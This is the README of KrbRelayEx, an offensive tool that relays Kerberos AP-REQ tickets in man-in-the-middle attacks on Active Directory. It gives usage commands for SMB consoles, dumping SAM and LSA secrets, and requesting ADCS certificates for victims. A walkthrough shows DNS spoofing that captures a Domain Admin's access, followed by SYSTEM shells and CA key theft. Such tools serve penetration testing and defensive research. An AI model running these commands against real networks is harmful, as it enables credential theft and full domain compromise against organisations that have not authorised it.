# KrbRelayEx

![Version](https://img.shields.io/badge/version-1.0-blue)  
Kerberos Relay and Forwarder for (Fake) SMB MiTM Server  

---

## Why this tool
I developed this tool to explore and understand the offensive capabilities of the DNSAdmins group in Active Directory, specifically their ability to modify DNS records. While DNSAdmins are recognized as privileged users, there has been limited documentation (beyond CVE-2021-40469) on how these privileges can be exploited. It's worth noting that manipulating DNS entries is not exclusive to DNSAdmins. Scenarios like DNS zones with insecure updates enabled (a surprisingly common misconfiguration!) or controlling HOSTS file entries on client machines can also enable such attacks.

The primary goal of this project was to test whether a Man-in-the-Middle (MitM) attack, leveraging DNS spoofing, forwarding, and Kerberos relaying, could be executed and abused effectively. 
Building upon this concept, I developed this tool, starting from [KrbRelay](https://github.com/cube0x0/KrbRelay), and implemented it in .NET 8.0 to ensure compatibility across both Windows and GNU/Linux platforms. 

## Overview

**KrbRelayEx** is a tool designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. It listens for incoming SMB connections and forwards the AP-REQ to the target host, enabling access to SMB shares or HTTP AD CS (Active Directory Certificate Services) endpoints on behalf the targeted identity.  

The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.  

GitHub Repository: [https://github.com/decoder-it/KrbRelayEx](https://github.com/decoder-it/KrbRelayEx)  


---

## Features

- Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.
- Interactive or background multithreaded SMB consoles for managing multiple connections, enabling file manipulation and creating/starting services
- Multithreaded port forwarding to support other protocols.
- Transparent relaying process for seamless user access.
- Runs on Winodws and GNU/Linux with .NET 8.0 sdk

## Notes

  - KrbRelayEx intercepts and relays the first authentication attempt,
    then switches to forwarder mode for all subsequent incoming requests.
    You can press any time 'r' for restarting relay mode

  - This tool is particularly effective if you can manipulate DNS names. Examples include:
    - Being a member of the DNS Admins group.
    - Having zones where unsecured DNS updates are allowed in Active Directory domains ==> This means that anonymous users with network access could potentially take over the domain!!!
    - Gaining control over HOSTS file entries on client computers.
  - Background consoles are ideal for managing multiple SMB consoles
    
  - A similar tool based on python and impacket libs can be found here https://github.com/almandin/krbjack
  
## Usage

```
        #############      KrbRelayEx by @decoder_it     ##############
        # Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
        # v1.0 2024                                                   #
        # Github: https://github.com/decoder-it/KrbRelayEx            #
        ###############################################################

Description:
  KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
  It listens for incoming SMB connections and forward the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints)
  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.

Usage:
  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]

SMB Attacks:
  -console                       Start an interactive SMB console
  -bgconsole                     Start an interactive SMB console in background via sockets
  -list                          List available SMB shares on the target system
  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
  -secrets                       Dump SAM & LSA secrets from the target system

HTTP Attacks:
  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
  -adcs <TEMPLATE>               Generate a certificate using the specified template

Options:
  -redirectserver <IP>           Specify the IP address of the target server for the attack
  -ssl                           Use SSL transport for secure communication
  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')
  -smbport <PORT>                Specify the SMB port to listen on (default: 445)

Examples:
  Start an interactive SMB console:
    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>

  List SMB shares on a target:
    KrbRelay.exe -spn SMB/target.domain.com -list

  Dump SAM & LSA secrets:
    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>

  Start a background SMB console on port 10000 upon relay:
    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>

  Generate a certificate using ADCS with a specific template:
    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>

  Relay attacks with SSL and port forwarding:
    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver  <ip_target_host> -redirectports 3389,5985,135,443,80
```
# Examples
SMB Relay:
==========
The user19 account is a member of the DNSAdmins group in the MYLAB.LOCAL domain and modifies the A record for SRV2-MYLAB. The IP 192.168.212.11 is our attacker machine.
In this case, we use the dnstool.py script from from https://github.com/dirkjanm/krbrelayx<br><br>
<img width="827" alt="image" src="https://github.com/user-attachments/assets/d66e4b5d-e1c6-472c-8b40-8951d969df3a">
<br><br>
On the attacker machine, we launch the relay/forwarder tool. SMB consoles will be launched in the background, starting from port 10000, and we will forward all traffic for WinRM, RPC Mapper, and Remote Desktop:<br><br>
<img width="818" alt="image" src="https://github.com/user-attachments/assets/93a31581-bd34-4d0a-8a4f-41d9bad95b2b">
<br><br>
A Domain Admin accesess the \\SRV2-MYLAB\c$ share without suspecting anything:
<br><br>
<img width="851" alt="image" src="https://github.com/user-attachments/assets/052199fc-c0ba-4505-9125-90b5b2763f16">

<br><br>
We intercept, relay, and forward the authenticated call to the SMB server:<br><br>
<img width="814" alt="image" src="https://github.com/user-attachments/assets/8413f774-0bb4-4cbc-998e-3581b546717e">
<br><br>
Finally, we gain access to the share with privileged permissions:
<br><br>
![image](https://github.com/user-attachments/assets/f08aa61c-0657-40c1-924f-753aebb8872b)

<br><br>
From here, we can:

- Write to protected locations with Domain Admin privileges.
- Create and start services that run under the LOCAL SYSTEM context.
 - And much more... 😉

HTTP(s) ADCSRelay:
==================
In this case the Zone MYLAB.LOCAL has been configured with Unsecure Update. Anonymous users with network access can modify DNS records!!<br><br>
![image](https://github.com/user-attachments/assets/920947a6-aae3-47bd-83d7-91c1d05150f4)

<br><br>

We intercept, relay, and forward the authenticated call to the HTTP ADCS server:<br><br>
<img width="965" alt="image" src="https://github.com/user-attachments/assets/1f859b23-1603-4eef-92b5-001b21e28624">

<br><br>

Administrator accesses a share of the ADCS Web Enrollment server:<br><br>
<img width="554" alt="image" src="https://github.com/user-attachments/assets/1d07c7bc-0394-488d-a26f-51c4c926f1fe">
<br><br>

Finally, we ge a client authentication certificate on behalf the Administrator:<br><br>
<img width="922" alt="image" src="https://github.com/user-attachments/assets/4a5795dc-4061-483e-be98-81ab5b89ef8e">
<br><br>
<br><br>
Or we could install a malicious service and get a shell running as SYSTEM
<br><br>
![image](https://github.com/user-attachments/assets/2bd5123e-9612-44eb-a397-2e10b330e53d)

<br><br>
On an ADCS server this would allow the backup of the the CA's private/public key enabling the forging of certificates on behalf of any user.

# Installation instructions

The tool has been build with .Net 8.0 Framework. The Dotnet Core runtime for Windows and GNU/Linux can be downloaded here:
- https://dotnet.microsoft.com/en-us/download/dotnet/8.0
- On Ubuntu distros: sudo apt install dotnet8
# Acknowledgements

[Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
<br>
[Using MITM to Attack Active Directory Authentication Schemes](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf)

